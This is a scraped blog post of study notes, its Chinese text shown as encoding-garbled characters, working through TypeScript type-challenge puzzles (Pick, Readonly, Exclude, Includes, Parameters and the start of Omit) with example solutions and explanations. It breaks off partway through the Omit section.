znSmmObJBkkUxrERf3i+ftRiZi7ShPCYY64UhTx1AR5CDYoMXkOKEY7GmTcTzeD/FiER68DfSLgSRqEIBoB3P8h3x8RZhBXGJGusJdD6rfCBl0YqvZNkrV9zej2cWlfJWG6fRpyM41qYH+GTPPi2yFLQYC0Qybm5o96lW77kMbcrBKtgeWTsthVamNXFF4I6x0DTPuugsVRFyYpyxzWqNvHJwed8ws7QyP1UwjNjwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fef6e1}.markdown-body a{text-decoration:none;color:#d8ac5a;border-bottom:1px solid #d8ac5a}.markdown-body a:active,.markdown-body a:hover{color:#93753f;border-color:#93753f}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f4e8c7;border-collapse:collapse}.markdown-body thead{background:rgba(255,227,176,.6588235294);text-align:left;display:table-header-group;border-bottom:1px solid rgba(255,227,176,.6588235294)}.markdown-body tbody{background:rgba(255,247,229,.3882352941)}.markdown-body td,.markdown-body th{padding:7px;line-height:24px;min-width:100px}.markdown-body blockquote{color:#bd954f;padding:1px 23px;margin:22px 0;border-left:4px solid #dcb267;background-color:#fff7e5}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol .task-list-item,.markdown-body ul .task-list-item{list-style:none}.markdown-body ol li{padding-left:6px}.markdown-body::marker{color:#dcb267}.markdown-body .contains-task-list{padding-left:0}.markdown-body .contains-task-list .task-list-item{list-style:none;position:relative}.markdown-body .contains-task-list .task-list-item input[type=checkbox]{position:relative;top:2px}.markdown-body .contains-task-list .task-list-item input[type=checkbox]:before{content:"";display:inline-block;height:12px;width:12px;position:absolute;left:-2px;top:-2px;border:2px solid #cda152;border-radius:5px}.markdown-body .contains-task-list .task-list-item input[type=checkbox]:checked{position:relative;top:2px}.markdown-body .contains-task-list .task-list-item input[type=checkbox]:checked:before{border:none;content:"";display:inline-block;height:17px;width:17px;position:absolute;left:-2px;top:-2px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAFo9M/3AAAAAXNSR0IArs4c6QAAAYhJREFUOBFjYACC0/MDGsDEiyvr/zOCeUwMJxn/A8HZRUEMYBFGJsZ6kFoQYALiAyAGCgDpA+sFijKeWRj4H1kWpIWBW1SDQcm+BCzOAiK/vr7BcO/gDbAAI4hE1waWgRBnmWCGIwkyKFjnwow0BhsJk9QLncvw5dV1oPE9MCEGmBWrgCKhcFEowyR+PSNYwemFAZ4M/xjMkRWYJm5oAPFB/joDpI1BHHQANgGPDxj+//vfCA4IdJ3GcevgQnAFhlHLwYIgSVA0wABcwY3tFQzokiBFGIEP0wmigW5wZAK5FFkQib0a6NUDcEmgb7AGFpIGZOZqoMFhIAFQknEAJpn9yLLEssFOBCp2IFaDkl0xg6C8FbJyB3gowUS5RdQYBORQYpVB1iwVHIIMwJh///AYTCmYRklNIBFmNi4GeYt0BhnjeIa3dw8wSBlEgDUhxw2yCRgGfHp2geHiqiSwUwUVrFAiFVkjjA1LrjgTHEwhFvosMCZM4NEIUoAtWWNoBGZ70/gN22HiAD2uhAzsYNBZAAAAAElFTkSuQmCC) 0 0 no-repeat;background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-seaside-light">.hljs-comment,.hljs-quote{color:#687d68}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#e6193c}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#87711d}.hljs-bullet,.hljs-string,.hljs-symbol{color:#29a329}.hljs-section,.hljs-title{color:#3d62f5}.hljs-keyword,.hljs-selector-tag{color:#ad2bee}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#f4fbf4;color:#5e6e5e}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>2026ä¸‰ç™¾é¢˜è®¡åˆ’ä¸€ï¼ˆ41 / 300ï¼‰</p>
<p>å…¶ä¸­æ ‡è®° â€» çš„æ˜¯æˆ‘è®¤ä¸ºæ¯”è¾ƒéš¾æˆ–è€…æ¶‰åŠæ–°çŸ¥è¯†ç‚¹çš„é¢˜ç›®</p>
</blockquote>
<p><em>åˆ·é¢˜ä¹Ÿè®¸æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Œä½†æ˜¯å–œæ¬¢ä¸€ä¸ªäººæ€è€ƒä¸€æ•´å¤©çš„çµå…‰ä¸€ç°ï¼Œä¹Ÿå–œæ¬¢çœ‹åˆ°æ–°å¥‡çš„ç­”æ¡ˆæ—¶çš„æç„¶å¤§æ‚Ÿï¼Œä»…æ­¤è€Œå·²ã€‚</em></p>
<h2 data-id="heading-0">Easy</h2>
<h3 data-id="heading-1">1. Easy - 4 - Pick</h3>
<p>ä»ç±»å‹ <code>T</code> ä¸­é€‰å‡ºç¬¦åˆ <code>K</code> çš„å±æ€§ï¼Œæ„é€ ä¸€ä¸ªæ–°çš„ç±»å‹</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyPick</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt; = {
  [key <span class="hljs-keyword">in</span> K]: T[key]
}
</code></pre>
<ul>
<li><code>keyof</code> æ˜¯ TypeScript ä¸­çš„ä¸€ä¸ªå…³é”®å­—ï¼Œç”¨äºè·å–ä¸€ä¸ªç±»å‹çš„æ‰€æœ‰å±æ€§åç»„æˆçš„è”åˆç±»å‹ã€‚</li>
<li><code>extends</code> å¯ä»¥ç”¨äºçº¦æŸæ³›å‹ç±»å‹å‚æ•°ã€å®šä¹‰ç±»å‹ç»§æ‰¿å…³ç³»å’Œæ¡ä»¶ç±»å‹çš„åˆ¤æ–­ã€‚</li>
<li>åœ¨æ˜ å°„ç±»å‹ä¸­ï¼Œå¯ä»¥é€šè¿‡ <code>in</code> å…³é”®å­—éå†è”åˆç±»å‹ï¼Œå¯ä»¥ç”¨äºéå†ä¸€ä¸ªç±»å‹çš„å±æ€§åï¼ˆéœ€è¦é€šè¿‡ <code>keyof</code> è·å–å±æ€§åç»„æˆçš„è”åˆç±»å‹ï¼‰ï¼Œå¹¶å¯¹æ¯ä¸ªå±æ€§è¿›è¡Œç›¸åº”çš„æ“ä½œã€‚</li>
</ul>
<h3 data-id="heading-2">2. Easy - 7 - Readonly</h3>
<p>æ³›å‹ <code>Readonly&lt;T&gt;</code> ä¼šæ¥æ”¶ä¸€ä¸ªæ³›å‹å‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„ç±»å‹ï¼Œåªæ˜¯æ‰€æœ‰å±æ€§éƒ½ä¼šæ˜¯åªè¯» (readonly) çš„ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyReadonly</span>&lt;T&gt; = {
  <span class="hljs-keyword">readonly</span> [key <span class="hljs-keyword">in</span> keyof T]: T[key];
}
</code></pre>
<ul>
<li>åœ¨ TypeScript ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ readonly ä¿®é¥°ç¬¦æ¥æŒ‡å®šä¸€ä¸ªåªè¯»å±æ€§ã€‚</li>
</ul>
<h3 data-id="heading-3">3. Easy - 11 - Tuple to Object</h3>
<p>å°†ä¸€ä¸ªå…ƒç»„ç±»å‹è½¬æ¢ä¸ºå¯¹è±¡ç±»å‹ï¼Œè¿™ä¸ªå¯¹è±¡ç±»å‹çš„é”®/å€¼å’Œå…ƒç»„ä¸­çš„å…ƒç´ å¯¹åº”ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleToObject</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> (<span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">symbol</span>)[]&gt; = {
 [key <span class="hljs-keyword">in</span> T[<span class="hljs-built_in">number</span>]]: key
}
</code></pre>
<ul>
<li>è¡¨ç¤ºå¤šç§ç±»å‹çš„æ•°æ®ï¼Œå…ˆé€šè¿‡ <code>(string | number | symbol)</code> è¡¨ç¤ºä¸€ä¸ªè”åˆï¼Œç„¶å <code>(string | number | symbol)[]</code> è¡¨ç¤ºè”åˆç±»å‹çš„æ•°ç»„</li>
<li>å…ƒç»„ç±»å‹æ˜¯ TypeScript ä¸­çš„ä¸€ç§ç‰¹æ®Šæ•°æ®ç±»å‹ï¼Œå®ƒå…è®¸æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå›ºå®šé•¿åº¦å’Œå›ºå®šç±»å‹é¡ºåºçš„æ•°ç»„ã€‚</li>
<li>é€šè¿‡ <code>T[number]</code> å¯ä»¥è·å–å…ƒç»„ <code>T</code> æ‰€æœ‰æˆå‘˜ç»„æˆçš„è”åˆç±»å‹ã€‚</li>
<li>åŠ readonly çš„ä½œç”¨ï¼Œå› ä¸ºæµ‹è¯•ç”¨ä¾‹å®šä¹‰çš„å˜é‡éƒ½æ˜¯ <code>const</code>ï¼Œ<code>const</code>çš„ä½œå¦‚ä¸‹ï¼š</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> tupleNumber = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-string">'33'</span>] <span class="hljs-comment">// (string | number)[]</span>
<span class="hljs-keyword">const</span> tupleNumber = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-string">'33'</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span> <span class="hljs-comment">// readonly [1, 2, "33"]</span>
</code></pre>
<h3 data-id="heading-4">4. Easy - 14 - First of Array</h3>
<p>å®ç°ä¸€ä¸ª <code>First&lt;T&gt;</code> æ³›å‹ï¼Œå®ƒæ¥å—ä¸€ä¸ªæ•°ç»„ <code>T</code> å¹¶è¿”å›å®ƒçš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ç±»å‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// è§£æ³•ä¸€ï¼šåˆ¤æ–­æ•°ç»„é•¿åº¦æ˜¯å¦ä¸º0</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">First</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt; = T[<span class="hljs-string">'length'</span>] <span class="hljs-keyword">extends</span> <span class="hljs-number">0</span> ? <span class="hljs-built_in">never</span> : T[<span class="hljs-number">0</span>]
<span class="hljs-comment">// è§£æ³•äºŒï¼šåˆ¤æ–­æ˜¯å¦ä¸ºç©ºæ•°ç»„</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">First</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt; = T <span class="hljs-keyword">extends</span> [] ? <span class="hljs-built_in">never</span> : T[<span class="hljs-number">0</span>]
<span class="hljs-comment">// è§£æ³•ä¸‰ï¼šè·å–Tæ‰€æœ‰å…ƒç´ ç±»å‹ç»„æˆçš„è”åˆç±»å‹ï¼Œå¦‚æœä¸ºneverè¯æ˜ä¸ºç©ºæ•°ç»„</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">First</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt; = T[<span class="hljs-built_in">number</span>] <span class="hljs-keyword">extends</span> <span class="hljs-built_in">never</span> ? <span class="hljs-built_in">never</span> : T[<span class="hljs-number">0</span>];
<span class="hljs-comment">// è§£æ³•å››ï¼šæˆ‘ä»¬å¯ä»¥é€šè¿‡ keyof T æ¥è·å–ç±»å‹ T æ‰€æœ‰é”®çš„ç±»å‹ç»„åˆï¼Œé‚£ä¹ˆå¦‚æœ '0' æ˜¯ T çš„é”®å°±è¡¨ç¤º T æ˜¯ä¸€ä¸ªéç©ºæ•°ç»„</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">First</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt; = <span class="hljs-string">'0'</span> <span class="hljs-keyword">extends</span> keyof T ? T[<span class="hljs-number">0</span>] : <span class="hljs-built_in">never</span>;
<span class="hljs-comment">// è§£æ³•äº”ï¼šinferè¿›è¡Œæ¨¡å¼åŒ¹é…</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">First</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt; = T <span class="hljs-keyword">extends</span> [infer A, ...infer _rest] ? A : <span class="hljs-built_in">never</span>
</code></pre>
<ul>
<li>åœ¨ TS ä¸­ <code>A extends B ? C : D</code> çš„æ„æ€æ˜¯â€œå¦‚æœ <code>A</code> å¯ä»¥èµ‹å€¼ç»™ <code>B</code>ï¼Œé‚£ä¹ˆç±»å‹å°±æ˜¯ <code>C</code>ï¼Œå¦åˆ™å°±æ˜¯ <code>D</code>â€ã€‚</li>
<li>T[0] è·å–æ•°ç»„ <code>T</code> ä¸‹æ ‡ä¸º 0 çš„å…ƒç´ ç±»å‹</li>
<li>åœ¨ TS ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ extends å’Œ infer å¯ä»¥å®ç°ä¸€ä¸ªç±»ä¼¼äºæ¨¡å¼åŒ¹é…çš„æ•ˆæœï¼Œ</li>
<li>å…¶ä¸­ ...infer _rest æ˜¯æˆ‘ä»¬å¯¹å…ƒç»„ç±»å‹ä½¿ç”¨çš„æ‰©å±•è¿ç®—ï¼Œåœ¨è¿™é‡Œç”¨äºè¡¨ç¤ºå‰©ä½™å…ƒç´ ã€‚</li>
</ul>
<h3 data-id="heading-5">5. Easy - 18 - Length of Tuple</h3>
<p>åˆ›å»ºä¸€ä¸ªLengthæ³›å‹ï¼Œè¿™ä¸ªæ³›å‹æ¥å—ä¸€ä¸ªåªè¯»çš„å…ƒç»„ï¼Œè¿”å›è¿™ä¸ªå…ƒç»„çš„é•¿åº¦ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Length</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">unknown</span>[]&gt; = T[<span class="hljs-string">'length'</span>]
</code></pre>
<ul>
<li><code>T['length']</code> æ˜¯ç´¢å¼•è®¿é—®ç±»å‹ï¼Œç”¨äºè·å–å¯¹è±¡/æ•°ç»„ç±»å‹çš„å±æ€§ç±»å‹</li>
<li>å¯¹äºå…ƒç»„ï¼ˆtupleï¼‰ï¼Œ<code>length</code> æ˜¯å­—é¢é‡æ•°å­—ç±»å‹ï¼ˆå¦‚ 3ï¼‰</li>
<li>å¯¹äºæ™®é€šæ•°ç»„ï¼Œ<code>length</code> æ˜¯ number ç±»å‹</li>
</ul>
<h3 data-id="heading-6">6. Easy - 43 - Exclude â€»</h3>
<p>ä»è”åˆç±»å‹ T ä¸­æ’é™¤ U ä¸­çš„ç±»å‹ï¼Œæ¥æ„é€ ä¸€ä¸ªæ–°çš„ç±»å‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyExclude</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? <span class="hljs-built_in">never</span> : T;
</code></pre>
<ul>
<li>å½“ <code>T extends U ? ...</code> ä¸­çš„ <code>T</code> ä¸ºè”åˆç±»å‹æ—¶ï¼Œä¼šæŠŠè”åˆç±»å‹ä¸­çš„æ¯ä¸€ä¸ªç±»å‹å•ç‹¬è¿›è¡Œåˆ¤æ–­ï¼Œç„¶åå†æŠŠç»“æœç»„åˆæˆä¸€ä¸ªè”åˆç±»å‹è¿”å›ã€‚</li>
<li>å¦‚æœä½ æƒ³é¿å…è¿™ç§è¡Œä¸ºï¼Œé‚£ä¹ˆä½¿ç”¨ [] åŒ…è£¹ä½ çš„ç±»å‹å‚æ•°å³å¯ï¼Œæ³¨æ„åœ¨ extends å…³é”®å­—çš„ä¸¤ä¾§éƒ½éœ€è¦ï¼š <code>[T] extends [U] ? ...</code></li>
</ul>
<p>è¯¦è§£è§ <a href="https://juejin.cn/post/7280430525700964386" target="_blank" title="https://juejin.cn/post/7280430525700964386">ã€ŠTypeScript ç±»å‹ä½“æ“ä¹‹ Excludeã€‹</a></p>
<h3 data-id="heading-7">7. Easy - 189 - Awaited</h3>
<p>å‡å¦‚æˆ‘ä»¬æœ‰ä¸€ä¸ª <code>Promise</code> å¯¹è±¡ï¼Œè¿™ä¸ª <code>Promise</code> å¯¹è±¡ä¼šè¿”å›ä¸€ä¸ªç±»å‹ã€‚åœ¨ TS ä¸­ï¼Œæˆ‘ä»¬ç”¨ <code>Promise</code> ä¸­çš„ <code>T</code> æ¥æè¿°è¿™ä¸ª <code>Promise</code> è¿”å›çš„ç±»å‹ã€‚è¯·ä½ å®ç°ä¸€ä¸ªç±»å‹ï¼Œå¯ä»¥è·å–è¿™ä¸ªç±»å‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Thenable</span>&lt;T&gt; {
  <span class="hljs-attr">then</span>: <span class="hljs-function">(<span class="hljs-params">onfulfilled: (arg: T) =&gt; <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">any</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyAwaited</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt; | <span class="hljs-title class_">Thenable</span>&lt;<span class="hljs-built_in">any</span>&gt;&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer A&gt; | <span class="hljs-title class_">Thenable</span>&lt;infer A&gt;
  ? A <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer _X&gt; | <span class="hljs-title class_">Thenable</span>&lt;infer _X&gt; ? <span class="hljs-title class_">MyAwaited</span>&lt;A&gt; : A
  : <span class="hljs-built_in">never</span>
</code></pre>
<h3 data-id="heading-8">8. Easy - 268 - IF</h3>
<p>å®ç°ä¸€ä¸ªÂ <code>IF</code>Â ç±»å‹ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªæ¡ä»¶ç±»å‹Â <code>C</code>Â ï¼Œä¸€ä¸ªåˆ¤æ–­ä¸ºçœŸæ—¶çš„è¿”å›ç±»å‹Â <code>T</code>Â ï¼Œä»¥åŠä¸€ä¸ªåˆ¤æ–­ä¸ºå‡æ—¶çš„è¿”å›ç±»å‹Â <code>F</code>ã€‚Â <code>C</code>Â åªèƒ½æ˜¯Â <code>true</code>Â æˆ–è€…Â <code>false</code>ï¼ŒÂ <code>T</code>Â å’ŒÂ <code>F</code>Â å¯ä»¥æ˜¯ä»»æ„ç±»å‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">If</span>&lt;C <span class="hljs-keyword">extends</span> <span class="hljs-built_in">boolean</span>, T, F&gt; = C <span class="hljs-keyword">extends</span> <span class="hljs-literal">true</span> ? T : F;
</code></pre>
<p>é€šè¿‡ <code>C extends true</code> æ¥åˆ¤æ–­ C æ˜¯å¦ä¸º trueã€‚</p>
<h3 data-id="heading-9">9. Easy - 533 - Concat</h3>
<p>åœ¨ç±»å‹ç³»ç»Ÿé‡Œå®ç° JavaScript å†…ç½®çš„Â <code>Array.concat</code>Â æ–¹æ³•ï¼Œè¿™ä¸ªç±»å‹æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œè¿”å›çš„æ–°æ•°ç»„ç±»å‹åº”è¯¥æŒ‰ç…§è¾“å…¥å‚æ•°ä»å·¦åˆ°å³çš„é¡ºåºåˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„æ•°ç»„ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Concat</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">unknown</span>[], U <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">unknown</span>[]&gt; = [...T, ...U]
</code></pre>
<ul>
<li><strong>åœ¨ TS ä¸­ï¼Œæ‰©å±•è¯­æ³•å¯ä»¥å¯¹å…ƒç»„ç±»å‹ä½¿ç”¨ï¼Œç”¨æ³•ç±»ä¼¼äºåœ¨ JS ä¸­å¯¹å€¼çš„ä½¿ç”¨</strong></li>
</ul>
<h3 data-id="heading-10">10. Easy - 898 - Includes â€»</h3>
<p>åœ¨ç±»å‹ç³»ç»Ÿé‡Œå®ç° JavaScript çš„Â <code>Array.includes</code>Â æ–¹æ³•ï¼Œè¿™ä¸ªç±»å‹æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œè¿”å›çš„ç±»å‹è¦ä¹ˆæ˜¯Â <code>true</code>Â è¦ä¹ˆæ˜¯Â <code>false</code>ã€‚</p>
<p>ä¸€å¼€å§‹æˆ‘æƒ³çš„æ˜¯ <code>type Includes&lt;T extends readonly any[], U&gt; =  U extends T[number] ? true : false</code></p>
<p>ä½†æ˜¯ <code>extends</code> æ— æ³•ä¿è¯å…¨ç­‰ï¼Œ<code>  Expect&lt;Equal&lt;Includes&lt;[{}], { a: 'A' }&gt;, false&gt;&gt;</code> æ¯”å¦‚è¿™ä¸ª case ä¼šå¤±è´¥ã€‚</p>
<p>æ­£ç¡®ç­”æ¡ˆä¸º</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Equal</span>&lt;X, Y&gt; = (&lt;T&gt;<span class="hljs-function">() =&gt;</span> T <span class="hljs-keyword">extends</span> X ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>) <span class="hljs-keyword">extends</span> &lt;T&gt;<span class="hljs-function">() =&gt;</span> T <span class="hljs-keyword">extends</span> Y ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>
  ? <span class="hljs-literal">true</span>
  : <span class="hljs-literal">false</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Includes</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">unknown</span>[], U&gt; = 
  T <span class="hljs-keyword">extends</span> [infer F, ...infer <span class="hljs-title class_">Rest</span>]
    ? <span class="hljs-title class_">Equal</span>&lt;F, U&gt; <span class="hljs-keyword">extends</span> <span class="hljs-literal">true</span> ? <span class="hljs-literal">true</span> : <span class="hljs-title class_">Includes</span>&lt;<span class="hljs-title class_">Rest</span>, U&gt;
    : <span class="hljs-literal">false</span>;
</code></pre>
<ul>
<li>å…¶ä¸­ <code>[infer F, ...infer Rest]</code> æ¥æå–å‡ºå…ƒç»„ä¸­çš„ç¬¬ä¸€ä¸ªç±»å‹ï¼Œç„¶åé€šè¿‡é€’å½’çš„æ–¹å¼ï¼Œä¾æ¬¡åˆ¤æ–­æ¯ä¸€ä¸ªç±»å‹å…ƒç´ æ˜¯å¦å’Œ <code>U</code> ç›¸ç­‰ã€‚</li>
<li>Equal å®ç°åŸç†å¾ˆå¤æ‚ï¼Œæš‚æ—¶æä¸æ‡‚ï¼Œè®°ä½å°±è¡Œ</li>
</ul>
<h3 data-id="heading-11">11. Easy - 3057 - Push</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Push</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">unknown</span>[], U&gt; = [...T, U]
</code></pre>
<p>åšè¿‡ä¸Šé¢çš„ Concat è¿™é“é¢˜å°±å¾ˆç®€å•äº†ï¼Œæ³¨æ„éœ€è¦é€šè¿‡ <code>T extends unknown[]</code> æ¥é™å®š <code>T</code> çš„ç±»å‹ï¼Œå¦åˆ™æ— æ³•ä½¿ç”¨ <code>...T</code>ã€‚</p>
<h3 data-id="heading-12">12. Easy - 3060 - Unshift</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Unshift</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">unknown</span>[], U&gt; = [U, ...T]
</code></pre>
<h3 data-id="heading-13">13. Easy - 3312 - Parameters</h3>
<p>å®ç°å†…ç½®çš„ ParametersÂ ç±»å‹</p>
<p>è¿™ç§é¢˜ç›®ä¸€çœ‹å°±æ˜¯è¦ä½¿ç”¨ <code>infer</code> è®© T extends xxxï¼Œå…¶ä¸­ xxx é‡Œé¢é€šè¿‡ infer æ ‡è®°å‡ºå…¥å‚çš„ç±»å‹åã€‚ä¸è¿‡è¿™é‡Œä¸€å¼€å§‹å†™é”™äº†å†™æˆäº†</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyParameters</span>&lt;T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; <span class="hljs-built_in">any</span>&gt; = 
    T <span class="hljs-keyword">extends</span> (infer A =&gt; <span class="hljs-built_in">any</span>) ? A : <span class="hljs-built_in">never</span>
</code></pre>
<p>é”™è¯¯çš„åŸå› ï¼š<strong>æŠŠç±»å‹å½“å˜é‡æ¥ç”¨äº†</strong> åœ¨åšç±»å‹ä½“æ“çš„æ—¶å€™å·²ç»å‡ºäº†å¾ˆå¤šæ¬¡é”™è¯¯äº†ã€‚è°¨è®°è°¨è®°ã€‚</p>
<p>æ­£ç¡®è§£æ³•ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyParameters</span>&lt;T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; <span class="hljs-built_in">any</span>&gt; = 
    T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: infer A) =&gt; <span class="hljs-built_in">any</span> ? A :<span class="hljs-built_in">never</span>
</code></pre>
<ul>
<li>ä½¿ç”¨ <code>infer</code> è¡¨ç¤ºå¾…æ¨æ–­çš„ç±»å‹å˜é‡ï¼Œç”±äº <code>...args</code> æœ¬èº«å·²ç»æ˜¯å…ƒç»„ç±»å‹ï¼Œå› æ­¤ <code>infer P</code> æœ€ç»ˆæ¨å¯¼å‡ºçš„ï¼Œä¹Ÿæ˜¯å…ƒç»„ç±»å‹ã€‚</li>
</ul>
<h2 data-id="heading-14">Medium</h2>
<h3 data-id="heading-15">14. Medium - 2 - Get Return Type è·å–å‡½æ•°è¿”å›ç±»å‹</h3>
<p>å’Œè·å–å‚æ•°ç±»å‹çš„é€»è¾‘æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyReturnType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; infer R ? R : <span class="hljs-built_in">never</span>
</code></pre>
<h3 data-id="heading-16">15. Medium - 3 - å®ç° Omit *</h3>
<p>è§£æ³•ä¸€ï¼Œå»éå† T ä¸­é™¤äº† K çš„é”®ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyExclude</span>&lt;T, P&gt; = T <span class="hljs-keyword">extends</span> P ? <span class="hljs-built_in">never</span> : T;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyOmit</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt; = {
  [P <span class="hljs-keyword">in</span> <span class="hljs-title class_">MyExclude</span>&lt;keyof T, K&gt;]: T[key]
}
</code></pre>
<p>è§£æ³•äºŒï¼Œåˆ©ç”¨ Pick å®ç°ï¼Œè·å– T ä¸­é™¤äº† K çš„é”®</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyOmit</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt; = <span class="hljs-title class_">Pick</span>&lt;T, <span class="hljs-title class_">Exclude</span>&lt;keyof T, K&gt;&gt;
</code></pre>
<p>è§£æ³•ä¸‰ï¼Œç›´æ¥å®ç°</p>
<p>ä¸€å¼€å§‹æˆ‘æ˜¯è¿™æ ·æƒ³çš„ï¼Œä½†æ˜¯è¿™æ ·ä¸å¯¹ï¼Œå› ä¸ºä¸åº”è¯¥å­˜åœ¨çš„é”®ä¹Ÿä¼šå­˜åœ¨ï¼Œåªä¸è¿‡ç±»å‹ä¸º <code>never</code>ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyOmit</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt; = {
  [P <span class="hljs-keyword">in</span> keyof T]: P <span class="hljs-keyword">extends</span> K ? <span class="hljs-built_in">never</span> : T[key]
}
</code></pre>
<p>è¦å°†å¯¹åº”çš„é”®è®¾ç½®ä¸º <code>never</code></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyOmit</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt; = {
